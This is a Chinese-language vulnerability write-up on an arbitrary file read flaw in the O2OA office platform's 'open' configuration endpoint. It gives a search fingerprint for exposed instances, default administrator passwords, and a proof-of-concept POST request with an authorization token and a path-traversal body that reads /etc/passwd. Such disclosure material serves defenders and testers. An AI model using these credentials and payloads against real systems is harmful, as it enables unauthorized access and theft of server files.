# O2OA open 后台任意文件读取漏洞

## 漏洞描述

O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统 open 接口存在任意文件读取漏洞。攻击者可利用漏洞读取任意文件。

## 漏洞影响

<a-checkbox checked>O2OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="O2OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1661649878832-df6a8d1f-e402-4db0-b567-7d0803a43c0a-8539272.png)

默认密码登录后台 xadmin/o2 (o2oa@2022),  验证POC

```php
POST /x_program_center/jaxrs/config/open?v=6.3
Authorization: PfyuxmzgIzq74NYhOcQ5NGbegmqb8H4y50QnO7mEHhA

{"fileName":"../../../etc/passwd"}
```

![img](../../../.vuepress/public/img/1661746022863-2eb3f02d-8437-4fa6-bb7f-dc401c699a63.png)